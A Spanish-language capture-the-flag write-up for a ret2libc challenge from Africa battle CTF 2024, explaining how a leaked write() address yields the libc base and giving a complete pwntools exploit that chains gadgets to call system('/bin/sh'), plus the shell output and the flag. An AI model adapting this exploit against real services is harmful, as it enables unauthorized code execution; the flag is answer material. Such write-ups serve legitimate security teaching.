Consiste en un ret2libc, la direccion de Write se encuentra filtrada:

```
 Africa battle CTF 2024
 Write() address : 0x7fbd61f354d0
```

El offset es de 72 bytes, el objetivo es obtener la direccion base de libc a partir de la direccion de la funcion filtrada y el offset de esa misma funcion con respecto a libc. Luego usamos algun gadget para llamar a system(arg1), que ejecutará un comando en el equipo. Como system necesita un argumento y en la arquitectura amd64 el primer argumento pasado a una función es rdi, entonces el plan es el siguente:

+ Encontrar la direccion base de libc
+ Escribir la direccion '/bin/sh' en rdi
+ Ejecutar system('/bin/sh')

Este es el exploit de python:

``` python
from pwn import *
io = remote('localhost',1003)
libc = ELF('./source/libc.so.6',checksec=False)

pop_rax_ret = 0x0000000000040647
pop_rdi_jmp_rax = 0x000000000002b003

io.recvline()
io.recvuntil(b'Write() address : ')
libc.address = int(io.recvuntil(b'\n'),16) - libc.symbols['write']

payload = b'A'*72
payload += p64(libc.address+pop_rax_ret)
payload += p64(libc.symbols['system'])
payload += p64(libc.address+pop_rdi_jmp_rax)
payload += p64(next(libc.search(b'/bin/sh')))

io.send(payload)
io.interactive()
```

Ganamos la shell interactiva y obtenemos la flag:

```
[+] Opening connection to localhost on port 1003: Done
[*] Switching to interactive mode
$ cat flag.txt
battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}
```

`battleCTF{Libc_J0P_b4s1c_000_bc8a769d91ae062911c32829608e7d547a3f54bd18c7a7c2f5cc52bd}`
